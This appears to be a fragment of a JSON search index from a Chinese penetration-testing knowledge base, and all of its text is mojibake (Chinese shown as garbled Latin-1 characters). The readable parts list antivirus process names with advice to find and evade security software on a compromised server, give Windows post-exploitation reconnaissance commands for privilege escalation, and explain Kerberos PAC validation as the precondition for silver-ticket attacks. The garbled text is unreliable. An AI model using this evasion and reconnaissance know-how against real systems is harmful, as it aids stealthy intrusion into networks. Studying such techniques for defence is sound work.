360ç³»åˆ—ï¼š360tray.exe/360safe.exe/ZhuDongFangYu.exe/360sd.exe QQç”µè„‘ç®¡å®¶ï¼šQQPCRTP.exe Aviraï¼ˆå°çº¢ä¼ï¼‰ï¼šavcenter.exe/avguard.exe/avgnt.exe/sched.exe å®‰å…¨ç‹—ï¼šSafeDogGuardCenter.exeç­‰å¸¦æœ‰safedogå­—ç¬¦çš„è¿›ç¨‹ Dç›¾ï¼šD_Safe_Manage.exe/d_manage.exe ç«ç»’ï¼šhipstray.exe/wsctrl.exe/usysdiag.exe å¡å·´æ–¯åŸºï¼šavp.exe Mcafeeï¼šMcshield.exe/Tbmom.exe/Frameworkservice.exe ESET NOD32ï¼šegui.exe/ekrn.exe/eguiProxy.exe èµ›é—¨é“å…‹ï¼šccSetMgr.exe è¶‹åŠ¿æ€æ¯’ï¼šTMBMSRV.exe ç‘æ˜Ÿæ€æ¯’ï¼šRavMonD.exe ç›²ç›®åœ°å‘æœåŠ¡å™¨ä¸Šä¼ åˆ©ç”¨å·¥å…·æˆ–ä»£ç å¾ˆå®¹æ˜“è§¦å‘æœåŠ¡å™¨åœ°é˜²æŠ¤è½¯ä»¶ã€‚æ‰€ä»¥ï¼Œåœ¨è·å–åˆ°æœåŠ¡å™¨çš„é˜²ç«å¢™çŠ¶æ€å’Œå®‰å…¨è½¯ä»¶ä¿¡æ¯åï¼Œæˆ‘ä»¬è¦çŸ¥é“æœåŠ¡å™¨ä¸­æ˜¯å¦å­˜åœ¨å¯èƒ½ä¼šæš´éœ²æˆ‘ä»¬è¡Œè¸ªçš„é˜²æŠ¤è½¯ä»¶ï¼Œæ ¹æ®è·å¾—çš„ä¿¡æ¯ï¼Œè¿›è¡Œé’ˆå¯¹æ€§çš„å…æ€\n",
        "summary": "æƒé™æå‡-windowsä¸‹çš„ä¿¡æ¯æ”¶é›† è¿›å…¥å†…ç½‘åï¼Œå¯ä»¥é€šè¿‡ä¿¡æ¯æ”¶é›†æ‰©å±•æ”»å‡»é¢ï¼Œæ‰¾åˆ°æ›´å¤šå¯èƒ½å¯¼è‡´æƒé™æå‡çš„å…¥å£ç‚¹\næœåŠ¡å™¨ä¿¡æ¯æšä¸¾ ç‰ˆæœ¬ä¿¡æ¯ æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬å·ï¼š\nver æ¶æ„ä¿¡æ¯ è·å–åˆ°æœåŠ¡å™¨æ¶æ„ä¿¡æ¯ï¼Œæœ‰åŠ©äºåç»­é€‰æ‹©å¯¹åº”çš„æ¼æ´åˆ©ç”¨ç¨‹åºæˆ–ç¼–å†™expå’Œpayload\nwmic os get osarchitecture æˆ–\necho %PROCESSOR_ARCHITECTURE% æœåŠ¡ä¿¡æ¯ è·å–æœåŠ¡ä¿¡æ¯å¯ä»¥å¾—çŸ¥ç³»ç»ŸæœåŠ¡çš„è¿›ç¨‹IDã€å¯åŠ¨æ–¹å¼å’ŒçŠ¶æ€ï¼Œæ•ˆæœç±»ä¼¼äºè¿è¡Œservices.msc\nsc query state=all æˆ–\nwmic service list brief powershellå‘½ä»¤è·å–æœåŠ¡åŠæœåŠ¡å¯¹åº”çš„æ‰§è¡Œæ–‡ä»¶è·¯å¾„å’Œå‚æ•°ï¼š\nGet-wmiObject win32_service | select Name,PathName è¿›ç¨‹ä¿¡æ¯ è·å–ç³»ç»Ÿè¿›ç¨‹:\ntasklist è·å–è¿›ç¨‹ä¿¡æ¯:\ntasklist /svc ä½¿ç”¨wmicå‘½ä»¤è·å–ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯ï¼š\nwmic process list brief ä¹Ÿå¯ä»¥ä½¿ç”¨powershell cmdletå‘½ä»¤ï¼š\nps æˆ–\nGet-WmiObject -Query \u0026#34;select * from Win32_Process\u0026#34; | where {$_.Name -notlike \u0026#34;svchost*\u0026#34;} | Select-Object Name, Handle, @{Label=\u0026#34;Owner\u0026#34;;Expression={$_.GetOwner().User}} | Format-Table -AutoSize é©±åŠ¨ä¿¡æ¯ è·å–å½“å‰ç³»ç»Ÿä¸­å®‰è£…çš„æœåŠ¡å™¨é©±åŠ¨ç¨‹åºä¿¡æ¯ï¼š\ndriverquery æœåŠ¡å™¨é©±åŠ¨ç¨‹åºä¿¡æ¯æœ‰åŠ©äºæˆ‘ä»¬å‘ç°å¯èƒ½å­˜åœ¨æ¼æ´çš„é©±åŠ¨ï¼Œè¿›è€Œå»æœç´¢æ¼æ´åˆ©ç”¨ç¨‹åºè¿›è¡Œææƒ\nç£ç›˜ä¿¡æ¯ è·å–è®¡ç®—æœºçš„å…¨éƒ¨ç£ç›˜ä¿¡æ¯ï¼š\nwmic logicaldisk get caption,description,providername è·å–æŸä¸ªç£ç›˜çš„æ–‡ä»¶å¤¹æ ‘å¹¶å°†ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶å¤¹ä¸­ï¼š\ntree D:\\ \u0026gt;E:\\Desktop\\tree.txt è·å–æŸä¸ªç£ç›˜çš„æ–‡ä»¶åˆ—è¡¨å¹¶å°†ç»“æœè¾“å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ä¸­ï¼š\ndir /s D:\\ \u0026gt;E:\\Desktop\\tree.txt è¡¥ä¸ä¿¡æ¯ è·å–ç³»ç»Ÿè¡¥ä¸æƒ…å†µï¼š\nwmic qfe get Caption,Description,HotFixID,InstalledOn ä¹Ÿå¯ä»¥ä½¿ç”¨Powershell cmdletå‘½ä»¤ï¼š\nGet-wmiObject -query \u0026#39;select * from win32_quickfixengineering\u0026#39; | foreach {$_.hotfixid} æˆ–\n"
    }
,
    {
        "title": "Windowsåè®®ä¹‹Kerberos",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bkerberos/",
        "content": "Windowsåè®®ä¹‹Kerberos Kerberosåè®®ä¸€ç§ç½‘ç»œèº«ä»½éªŒè¯åè®®ï¼Œæ˜¯ä¸€ç§åœ¨å¼€æ”¾çš„éå®‰å…¨ç½‘ç»œä¸­è®¤è¯å¹¶è¯†åˆ«ç”¨æˆ·èº«ä»½ä¿¡æ¯çš„æ–¹æ³•ï¼Œæ—¨åœ¨ä½¿ç”¨å¯†é’¥åŠ å¯†æŠ€æœ¯ä¸ºå®¢æˆ·ç«¯/æœåŠ¡ç«¯æä¾›åº”ç”¨ç¨‹åºæä¾›å¼ºèº«ä»½éªŒè¯\nKerberosæœ¬æ¥æ˜¯è¥¿æ–¹ç¥è¯ä¸­å®ˆå«åœ°ç‹±ä¹‹é—¨çš„ä¸‰å¤´çŠ¬çš„åå­—ï¼Œä¹‹æ‰€ä»¥ä½¿ç”¨è¿™ä¸ªåå­—ï¼Œæ˜¯å› ä¸ºè¯¥åè®®éœ€è¦ä¸‰æ–¹å…±åŒå‚ä¸æ‰èƒ½å®Œæˆä¸€æ¬¡è®¤è¯ã€‚\nç›®å‰ä¸»æµä½¿ç”¨çš„Kerberosç‰ˆæœ¬ä¸º2005å¹´RFC4120**(https://www.rfc-editor.org/rfc/rfc4120.html)**æ ‡å‡†å®šä¹‰çš„KerberosV5ç‰ˆæœ¬ï¼ŒWindowsã€Linuxå’ŒMac OSå‡æ”¯æŒKerberosåè®®\nä¸€ã€KerberosåŸºç¡€ åœ¨Kerberosåè®®ä¸­ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªè§’è‰²ï¼š\nè®¿é—®æœåŠ¡çš„å®¢æˆ·ç«¯ï¼šKerberoså®¢æˆ·ç«¯ä»£è¡¨éœ€è¦è®¿é—®èµ„æºçš„ç”¨æˆ·è¿›è¡Œæ“ä½œçš„åº”ç”¨ç¨‹åºï¼Œä¾‹å¦‚æ‰“å¼€æ–‡ä»¶ã€æŸ¥è¯¢æ•°æ®åº“æˆ–æ‰“å°æ–‡æ¡£ã€‚æ¯ä¸ªKerberoså®¢æˆ·ç«¯åœ¨è®¿é—®èµ„æºä¹‹å‰éƒ½ä¼šè¯·æ±‚èº«ä»½éªŒè¯\næä¾›æœåŠ¡çš„æœåŠ¡ç«¯ï¼šåŸŸå†…æä¾›æœåŠ¡çš„æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯éƒ½æœ‰å”¯ä¸€çš„SPNï¼ˆæœåŠ¡ä¸»ä½“åç§°ï¼‰\næä¾›è®¤è¯æœåŠ¡çš„KDCï¼ˆKey Distribution Centerï¼Œå¯†é’¥åˆ†å‘ä¸­å¿ƒï¼‰ï¼šKDCæ˜¯ä¸€ç§ç½‘ç»œæœåŠ¡ï¼Œå®ƒå‘æ´»åŠ¨ç›®å½•åŸŸå†…çš„ç”¨æˆ·å’Œè®¡ç®—æœºæä¾›ä¼šè¯ç¥¨æ®å’Œä¸´æ—¶ä¼šè¯å¯†é’¥ï¼Œå…¶æœåŠ¡è´¦æˆ·ä¸ºkrbtgtã€‚KDCä½œä¸ºæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡çš„ä¸€éƒ¨åˆ†è¿è¡Œåœ¨æ¯ä¸ªåŸŸæ§ä¸Š\nè¿™é‡Œçš„krbtgtè´¦æˆ·æ˜¯åœ¨åˆ›å»ºæ´»åŠ¨ç›®å½•æ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªè´¦æˆ·ï¼Œå…¶ä½œç”¨æ˜¯åœ¨KDCçš„æœåŠ¡è´¦æˆ·ï¼Œå…¶å¯†ç æ˜¯ç³»ç»Ÿéšæœºç”Ÿæˆçš„ï¼Œæ— æ³•æ­£å¸¸ç™»é™†ä¸»æœº\nè€ŒKDCåŒ…å«ASï¼ˆAuthentication Serverï¼Œè®¤è¯æœåŠ¡å™¨ï¼‰å’ŒTGSï¼ˆTicket Granting Serverï¼Œç¥¨æ®æˆæƒæœåŠ¡å™¨ï¼‰\nKerberosæ˜¯ä¸€ç§åŸºäºç¥¨æ®ï¼ˆTicketï¼‰çš„è®¤è¯æ–¹å¼ã€‚å®¢æˆ·ç«¯æƒ³è¦è®¿é—®æœåŠ¡ç«¯çš„æŸä¸ªæœåŠ¡ï¼Œé¦–å…ˆéœ€è¦è´­ä¹°æœåŠ¡ç«¯è®¤å¯çš„STï¼ˆService Ticketï¼ŒæœåŠ¡ç¥¨æ®ï¼‰ã€‚é€šä¿—ç‚¹è¯´ï¼Œå°±æ˜¯å®¢æˆ·ç«¯åœ¨è®¿é—®æœåŠ¡å‰éœ€è¦å…ˆä¹°ç¥¨ï¼Œç­‰å¾…æœåŠ¡ç«¯éªŒç¥¨ä¹‹åæ‰å…è®¸è®¿é—®ã€‚è€Œè¯¥ç¥¨æ®ä¸èƒ½ç›´æ¥è´­ä¹°ï¼Œè¿˜éœ€è¦ä¸€å¼ TGTï¼ˆTiket Granting Tiketï¼Œè®¤è´­æƒè¯ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´å®¢æˆ·ç«¯åœ¨ä¹°ç¥¨å‰è¿˜éœ€è¦è·å¾—ä¸€å¼ TGTã€‚è€ŒSTå’ŒTGTå‡ç”±KDCå‘æ”¾ï¼Œå› ä¸ºKDCè¿è¡Œåœ¨åŸŸæ§ä¸Šï¼Œæ‰€ä»¥TGTå’ŒSTä¹Ÿå‡ç”±åŸŸæ§å‘æ”¾\nKerberosåè®®ä½¿ç”¨TCP/UDP 88 ç«¯å£è¿›è¡Œè®¤è¯ï¼Œä½¿ç”¨TCP/UDP 464 ç«¯å£è¿›è¡Œå¯†ç é‡è®¾\nKerberosåè®®æœ‰ä¸¤ä¸ªåŸºç¡€è®¤è¯æ¨¡å—ï¼šAS_REQ\u0026amp;AS_REP å’Œ TGS_REQ\u0026amp;TGS_REPï¼Œä»¥åŠå¾®è½¯æ‰©å±•çš„ä¸¤ä¸ªè®¤è¯æ¨¡å—S4Uå’ŒPACã€‚S4Uæ˜¯å¾®è½¯ä¸ºäº†å®ç°å§”æ´¾è€Œæ‰©å±•çš„æ¨¡å—ï¼Œåˆ†ä¸ºS4u2Selfå’ŒS4u2Proxyã€‚åœ¨Kerberosæœ€åˆè®¾è®¡çš„æµç¨‹é‡Œåªè¯´æ˜äº†å¦‚ä½•è¯æ˜å®¢æˆ·ç«¯çš„çœŸå®èº«ä»½ï¼Œå¹¶æ²¡æœ‰è¯´æ˜å®¢æˆ·ç«¯æ˜¯å¦æœ‰æƒé™è®¿é—®è¯¥æœåŠ¡ï¼Œå› ä¸ºåœ¨åŸŸä¸­ä¸åŒæƒé™çš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®çš„èµ„æºæ˜¯ä¸åŒçš„ã€‚å¾®è½¯ä¸ºäº†è§£å†³è¯¥é—®é¢˜ï¼Œå¼•å…¥äº†PACï¼ˆPrivilige Attribute Certificateï¼Œç‰¹æƒå±æ€§è¯ä¹¦ï¼‰çš„æ¦‚å¿µ\näºŒã€PAC PACåŒ…å«å„ç§æˆæƒä¿¡æ¯ã€é™„åŠ å‡­æ®ä¿¡æ¯ã€é…ç½®æ–‡ä»¶å’Œç­–ç•¥ä¿¡æ¯ç­‰ï¼Œä¾‹å¦‚ç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€ç”¨æˆ·æ‰€å…·æœ‰çš„æƒé™ç­‰ã€‚ä¸Šæ–‡æåˆ°è¿‡ï¼Œåœ¨æœ€åˆçš„RFC1510è§„å®šçš„æ ‡å‡†Kerberosè®¤è¯è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰PACï¼Œå¾®è½¯åœ¨è‡ªå·±çš„äº§å“å®ç°çš„Kerberosæµç¨‹ä¸­åŠ å…¥äº†PACçš„æ¦‚å¿µ\nåœ¨ä¸€ä¸ªæ­£å¸¸çš„kerberosè®¤è¯æµç¨‹ä¸­ï¼ŒKDCè¿”å›çš„TGTçš„STéƒ½å¸¦æœ‰PACï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯åœ¨ä»¥åå¯¹èµ„æºçš„è®¿é—®ä¸­ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·è¯·æ±‚çš„æ—¶å€™ä¸å†éœ€è¦å€ŸåŠ©KDCæä¾›å®Œæ•´çš„æˆæƒä¿¡æ¯æ¥å®Œæˆå¯¹ç”¨æˆ·æƒé™çš„åˆ¤æ–­ï¼Œè€Œåªéœ€è¦æ ¹æ®è¯·æ±‚ä¸­æ‰€åŒ…å«çš„PACä¿¡æ¯ç›´æ¥ä¸æœ¬åœ°èµ„æºçš„ACLç›¸æ¯”è¾ƒæ¥åšå‡ºè£å†³\n1.PACç»“æ„ PACçš„é¡¶éƒ¨ç»“æ„æ˜¯è¿™æ ·çš„ï¼š\ntypedef unsigned long ULONG; typedef unsigned short USHORT; typedef unsigned long64 ULONG64; typedef unsigned char UCHAR; typedef struct _PACTYPE { ULONG cBuffers; ULONG Version; PAC_INFO_BUFFER Buffers[1]; } PACTYPE; å„å­—æ®µå«ä¹‰:\ncBuffersï¼šåŒ…å«æ•°ç»„ç¼“å†²åŒºä¸­çš„æ¡ç›®æ•° Versionï¼šç‰ˆæœ¬ Buffersï¼šåŒ…å«ä¸€ä¸ªPAC_INFO_BUFFERç»“æ„çš„æ•°ç»„ è€ŒPAC_INFO_BUFFERç»“æ„åŒ…å«å…³äºæ¯ä¸ªéƒ¨åˆ†çš„ä¿¡æ¯ï¼Œéå¸¸é‡è¦ï¼š\ntypedef struct _PAC_INFO_BUFFER { ULONG ulType; ULONG cbBufferSize; ULONG64 Offset; } PAC_INFO_BUFFER; å„å­—æ®µå«ä¹‰ï¼š\nulTypeï¼šåŒ…å«æ­¤ç¼“å†²åŒºä¸­çš„æ•°æ®çš„ç±»å‹ï¼Œå¯èƒ½ä¸ºå¦‚ä¸‹å­—æ®µï¼š Logon Info (1) Client Info Type (10) UPN DNS Info (12) Server Checksum (6) Privsvr Checksum (7) cbBufferSizeï¼šç¼“å†²å¤§å° Offsetï¼šç¼“å†²åç§»é‡ 2.PACå‡­è¯ä¿¡æ¯ Logon Infoç±»å‹çš„PAC_LOGON_INFOåŒ…å«Kerberosç¥¨æ®å®¢æˆ·ç«¯çš„å‡­æ®ä¿¡æ¯ã€‚æ•°æ®æœ¬èº«åŒ…å«åœ¨ä¸€ä¸ªKERB_VALIDAVTION_INFOç»“æ„ä¸­ï¼Œè¯¥ç»“æ„æ˜¯ç”±NDRç¼–ç çš„ã€‚NDRç¼–ç çš„è¾“å‡ºè¢«æ”¾ç½®Logon Infoç±»å‹çš„PAC_INFO_BUFFERç»“æ„ä¸­ã€‚KERB_VALIDAVTION_INFOç»“æ„å®šä¹‰å¦‚ä¸‹ï¼š\ntypedef struct _KERB_VALIDATION_INFO { FILETIME Reserved0; FILETIME Reserved1; FILETIME KickOffTime; FILETIME Reserved2; FILETIME Reserved3; FILETIME Reserved4; UNICODE_STRING Reserved5; UNICODE_STRING Reserved6; UNICODE_STRING Reserved7; UNICODE_STRING Reserved8; UNICODE_STRING Reserved9; UNICODE_STRING Reserved10; USHORT Reserved11; USHORT Reserved12; ULONG UserId; ULONG PrimaryGroupId; ULONG GroupCount; [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds; ULONG UserFlags; ULONG Reserved13[4]; UNICODE_STRING Reserved14; UNICODE_STRING Reserved15; PSID LogonDomainId; ULONG Reserved16[2]; ULONG Reserved17; ULONG Reserved18[7]; ULONG SidCount; [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids; PSID ResourceGroupDomainSid; ULONG ResourceGroupCount; [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds; } KERB_VALIDATION_INFO; å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼š\nAcct Nameï¼šè¯¥å­—æ®µå¯¹åº”çš„å€¼æ˜¯ç”¨æˆ·sAMAccountNameå±æ€§çš„å€¼ Full Nameï¼šè¯¥å­—æ®µå¯¹åº”çš„å€¼æ˜¯ç”¨æˆ·displayNameå±æ€§çš„å€¼ User RIDï¼šè¯¥å­—æ®µå¯¹åº”çš„å€¼æ˜¯ç”¨æˆ·çš„RIDï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·SIDçš„æœ€åéƒ¨åˆ† Group RIDï¼šå¯¹äºè¯¥å­—æ®µï¼ŒåŸŸç”¨æˆ·çš„Group RIDæ’ä¸º513(ä¹Ÿå°±æ˜¯Domain Usersçš„RID)ï¼Œæœºå™¨ç”¨æˆ·çš„Group RIDæ’ä¸º515(ä¹Ÿå°±æ˜¯Domain Computersçš„RID)ï¼ŒåŸŸæ§çš„Group RIDæ’ä¸º516(ä¹Ÿå°±æ˜¯Domain Controllersçš„RID) Num RIDSï¼šç”¨æˆ·æ‰€å±ç»„çš„ä¸ªæ•° GroupIDSï¼šç”¨æˆ·æ‰€å±çš„æ‰€æœ‰ç»„çš„RID 3.PACç­¾å PACä¸­åŒ…å«ä¸¤ä¸ªæ•°å­—ç­¾åï¼š\nPAC_SERVER_CHECKSUM ï¼šä½¿ç”¨æœåŠ¡å¯†é’¥è¿›è¡Œç­¾å\nPAC_PRIVSVR_CHECKSUMï¼šä½¿ç”¨KDCå¯†é’¥è¿›è¡Œç­¾å\nç­¾åçš„åŸå› ï¼š\næœåŠ¡å¯†é’¥ç­¾åä»¥éªŒè¯æ­¤PACå·²ç”±æœåŠ¡ç­¾å KDCå¯†é’¥ç­¾åä»¥é˜²æ­¢ä¸å—ä¿¡ä»»çš„æœåŠ¡ç”¨æ— æ•ˆçš„PACä¸ºè‡ªå·±ä¼ªé€ ç¥¨æ® ä¸¤ä¸ªç­¾ååˆ†åˆ«ä»¥PAC_SERVER_CHECKSUMå’ŒPAC_PRIVSVR_CHECKSUMç±»å‹çš„PAC_INFO_BUFFERå‘é€\nåœ¨PACæ•°æ®ç”¨äºè®¿é—®æ§åˆ¶å‰ï¼Œå¿…é¡»æ£€æŸ¥PAC_SERVER_CHECKSUMç­¾åï¼Œè¿™å°†éªŒè¯å®¢æˆ·ç«¯æ˜¯å¦çŸ¥é“æœåŠ¡å¯†é’¥\nè€ŒPAC_PRIVSVR_CHECKSUMç­¾åçš„éªŒè¯æ˜¯å¯é€‰çš„ï¼Œé»˜è®¤ä¸å¼€å¯ï¼Œå…¶ç”¨äºéªŒè¯PACæ˜¯å¦ç”±KDCç­¾å‘ï¼Œè€Œä¸æ˜¯ç”±KDCä»¥å¤–çš„å…·æœ‰è®¿é—®æœåŠ¡å¯†é’¥çš„ç¬¬ä¸‰æ–¹æ”¾å…¥ç¥¨æ®ä¸­\nç­¾åéƒ¨åˆ†ç»“æ„å¦‚ä¸‹ï¼š\ntypedef struct _PAC_SIGNATURE_DATA { ULONG SignatureType; UCHAR Signature[1]; } PAC_SIGNATURE_DATA, *PPAC_SIGNATURE_DATA; å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼š\nSignatureTypeï¼šæ­¤å­—æ®µåŒ…å«ç”¨äºåˆ›å»ºç­¾åçš„æ ¡éªŒå’Œçš„ç±»å‹ï¼Œæ ¡éªŒå’Œå¿…é¡»æ˜¯ä¸€ä¸ªé”®æ§çš„æ ¡éªŒå’Œ\nSignatureï¼šæ­¤å­—æ®µç”±ä¸€ä¸ªåŒ…å«æ ¡éªŒå’Œæ•°æ®çš„å­—èŠ‚æ•°ç»„ç»„æˆï¼Œå­—èŠ‚çš„é•¿åº¦å¯ä»¥ç”±åŒ…è£…PAC_INFO_BUFFERç»“æ„æ¥å†³å®š\n4.KDCéªŒè¯PAC å½“æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„AP-REQæ¶ˆæ¯æ—¶ï¼Œåªèƒ½æ ¡éªŒPAC_SERVER_CHECKSUMç­¾åï¼Œå¹¶ä¸èƒ½æ ¡éªŒPAC_PRIVSVR_CHECKSUMç­¾å\nå¦‚æœè¦æ ¡éªŒPAC_PRIVSVR_CHECKSUMç­¾åï¼ŒæœåŠ¡ç«¯è¿˜éœ€è¦å°†å®¢æˆ·å‘æ¥çš„STä¸­çš„PACç­¾åå‘ç»™KDCè¿›è¡Œæ ¡éªŒï¼Œè€Œå¤§éƒ¨åˆ†æœåŠ¡é»˜è®¤å¹¶æ²¡æœ‰KDCéªŒè¯PACè¿™ä¸€æ­¥ï¼ˆéœ€è¦å°†ç›®æ ‡æœåŠ¡ä¸»æœºé…ç½®ä¸ºéªŒè¯KDC PACç­¾åï¼Œé»˜è®¤æœªå¼€å¯ï¼‰ï¼Œæ­¤æ—¶æœåŠ¡ç«¯å°±æ— éœ€å°†STä¸­çš„PACç­¾åå‘ç»™KDCæ ¡éªŒï¼Œè¿™ä¹Ÿæ˜¯ç™½é“¶ç¥¨æ®æ”»å‡»æˆåŠŸçš„å‰æ\næ‰§è¡ŒKDCéªŒè¯PACçš„è¯ï¼Œæ„å‘³ç€åœ¨å“åº”æ—¶é—´å’Œå¸¦å®½ä½¿ç”¨æ–¹é¢çš„æˆæœ¬ï¼Œå®ƒéœ€è¦å¸¦å®½ä½¿ç”¨æ¥åœ¨åº”ç”¨æœåŠ¡å™¨å’ŒKDCä¹‹é—´ä¼ è¾“è¯·æ±‚å’Œå“åº”ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å¤§å®¹é‡åº”ç”¨ç¨‹åºæœåŠ¡å™¨ä¸­å‡ºç°ä¸€äº›æ€§èƒ½é—®é¢˜ã€‚åœ¨è¿™æ ·çš„ç¯å¢ƒä¸­ï¼Œç”¨æˆ·èº«ä»½éªŒè¯å¯èƒ½ä¼šå¯¼è‡´é¢å¤–çš„ç½‘ç»œå»¶è¿Ÿå’Œå¤§é‡çš„æµé‡ã€‚å› æ­¤ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒKDCä¸éªŒè¯PACç­¾å\nå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸»æœºé…ç½®ä¸ºéœ€è¦æ ¡éªŒPAC_PRIVSVR_CHECKSUMç­¾åï¼ŒæœåŠ¡ç«¯ä¼šå°†è¿™ä¸ªPACçš„æ•°å­—ç­¾åä»¥KRB_VERIFY_PACçš„æ¶ˆæ¯é€šè¿‡RPCåè®®å‘é€ç»™KDCï¼ŒKDCå†å°†è¯¥PACæ•°å­—ç­¾åçš„ç»“æœä»¥RPCè¿”å›ç çš„å½¢å¼å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å°±å¯ä»¥æ ¹æ®è¿”å›ç»“æœåˆ¤æ–­PACçš„çœŸå®æ€§ä¸æœ‰æ•ˆæ€§äº†ï¼Œå¦‚æ­¤ï¼Œå³ä½¿æ”»å‡»è€…æ‹¥æœ‰æœåŠ¡å¯†é’¥ï¼Œå¯ä»¥åˆ¶ä½œSTï¼Œä¹Ÿæ— æ³•ä¼ªé€ KDCçš„PAC_PRIVSVR_CHECKSUMç­¾åï¼Œæ— æ³•é€šè¿‡KDCç­¾åæ ¡éªŒ\nè€Œä¸»æœºå¼€å¯KDCç­¾åæ ¡éªŒï¼Œéœ€è¦æœ‰ä»¥ä¸‹æ¡ä»¶ï¼š\nåº”ç”¨ç¨‹åºå…·æœ‰SeTcbPrivilegeæƒé™ï¼ŒSeTcbPrivilegeæƒé™å…è®¸ä¸ºç”¨æˆ·å¸æˆ·åˆ†é…â€œä½œä¸ºæ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†â€ã€‚æœ¬åœ°ç³»ç»Ÿã€ç½‘ç»œæœåŠ¡å’Œæœ¬åœ°æœåŠ¡å¸æˆ·éƒ½æ˜¯ç”±windowså®šä¹‰çš„æœåŠ¡ç”¨æˆ·å¸æˆ·ã€‚æ¯ä¸ªå¸æˆ·éƒ½æœ‰ä¸€ç»„ç‰¹å®šçš„ç‰¹æƒ\nåº”ç”¨ç¨‹åºæ˜¯ä¸€ä¸ªæœåŠ¡ï¼ŒéªŒè¯KDC PACç­¾åçš„æ³¨å†Œè¡¨é¡¹è¢«è®¾ç½®ä¸º1ï¼Œé»˜è®¤ä¸º0\nä¿®æ”¹æ–¹æ³•å¦‚ä¸‹ï¼š\nå¯åŠ¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨regedit.exe\næ‰¾åˆ°ä»¥ä¸‹å­é”®ï¼šHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters\næ·»åŠ ä¸€ä¸ªValidateKdcPacSignatureçš„é”®å€¼(DWORDç±»å‹)ã€‚è¯¥å€¼ä¸º0æ—¶ï¼Œä¸ä¼šè¿›è¡ŒKDC PACæ ¡éªŒã€‚è¯¥å€¼ä¸º1æ—¶ï¼Œä¼šè¿›è¡ŒKDC PACæ ¡éªŒã€‚å› æ­¤å¯ä»¥å°†è¯¥å€¼è®¾ç½®ä¸º1å¯ç”¨KDC PACæ ¡éªŒ\nå¯¹äºéªŒè¯KDC PACç­¾åè¿™ä¸ªæ³¨å†Œè¡¨é”®å€¼ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹æ³¨æ„äº‹é¡¹ï¼š\nå¦‚æœæœåŠ¡ç«¯å¹¶éä¸€ä¸ªæœåŠ¡ç¨‹åºï¼Œè€Œæ˜¯ä¸€ä¸ªæ™®é€šåº”ç”¨ç¨‹åºï¼Œå®ƒå°†ä¸å—ä»¥ä¸Šæ³¨å†Œè¡¨çš„å½±å“ï¼Œè€Œæ€»æ˜¯è¿›è¡ŒKDC PACæ ¡éªŒã€‚\nå¦‚æœæœåŠ¡ç«¯å¹¶éä¸€ä¸ªç¨‹åºï¼Œè€Œæ˜¯ä¸€ä¸ªé©±åŠ¨ï¼Œå…¶è®¤è¯è¿‡ç¨‹åœ¨ç³»ç»Ÿå†…æ ¸å†…å®Œæˆï¼Œå®ƒå°†ä¸å—ä»¥ä¸Šæ³¨å†Œè¡¨çš„å½±å“ï¼Œè€Œæ°¸ä¸è¿›è¡ŒPACæ ¡éªŒã€‚\nä½¿ç”¨ä»¥ä¸Šæ³¨å†Œè¡¨é¡¹ï¼Œéœ€è¦åœ¨Windows Server 2003 SP2æˆ–æ›´æ–°çš„æ“ä½œç³»ç»Ÿã€‚\nåœ¨è¿è¡ŒWindows Server 2008æˆ–æ›´æ–°æ“ä½œç³»ç»Ÿçš„æœåŠ¡å™¨ä¸Šï¼Œè¯¥æ³¨å†Œè¡¨é¡¹çš„å€¼ç¼ºçœä¸º0(é»˜è®¤æ²¡æœ‰è¯¥ValidateKdcPacSignatureé”®å€¼)ï¼Œä¹Ÿå°±æ˜¯ä¸è¿›è¡ŒKDC PACæ ¡éªŒã€‚\næ³¨ï¼šæ³¨å†Œåœ¨æœ¬åœ°ç³»ç»Ÿå¸æˆ·ä¸‹çš„æœåŠ¡æ— è®ºå¦‚ä½•é…ç½®ï¼Œéƒ½ä¸ä¼šè§¦å‘KDCéªŒè¯PACç­¾åã€‚ä¹Ÿå°±æ˜¯è¯´è­¬å¦‚SMBã€CIFSã€HOSTç­‰æœåŠ¡æ— è®ºå¦‚ä½•éƒ½ä¸ä¼šè§¦å‘KDCéªŒè¯PACç­¾åã€‚\n5.PACåœ¨Kerberosä¸­çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹\nå®¢æˆ·ç«¯åœ¨è®¿é—®ç½‘ç»œèµ„æºçš„æ—¶å€™æœåŠ¡ç«¯ä¸å†éœ€è¦å‘KDCæŸ¥è¯¢æˆæƒä¿¡æ¯ï¼Œ 